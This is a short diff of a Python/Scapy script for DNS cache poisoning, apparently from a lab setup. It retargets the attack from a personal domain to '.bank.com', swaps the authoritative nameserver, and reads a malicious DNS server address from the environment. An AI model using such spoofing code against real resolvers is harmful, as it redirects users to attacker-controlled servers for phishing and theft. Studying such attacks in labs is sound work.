@@ -13,13 +13,14 @@ target_dns_port_in = int(os.environ['VLN_DNS_PORT_IN'])
 target_dns_port_out = int(os.environ['VLN_DNS_PORT_OUT'])
 
 # Target domain base to be messed with
-target_domain_base = ".lukasjung.de."
+target_domain_base = ".bank.com"
 # Authoritative NS for the target domain
-known_ns_domain = "ns1.hans.hosteurope.de."
-known_ns_ip = "217.115.143.140"
+known_ns_domain = "ns01.cashparking.com."
+known_ns_ip = "216.69.185.38"
 
 # Malicious DNS server
 attacker_dns_ip = os.environ['ATK_SERVER_IP']
+
 
 def initial_request(domain, ip, port):
     return Ether() / IP(dst=ip) / UDP(dport=port) / DNS(
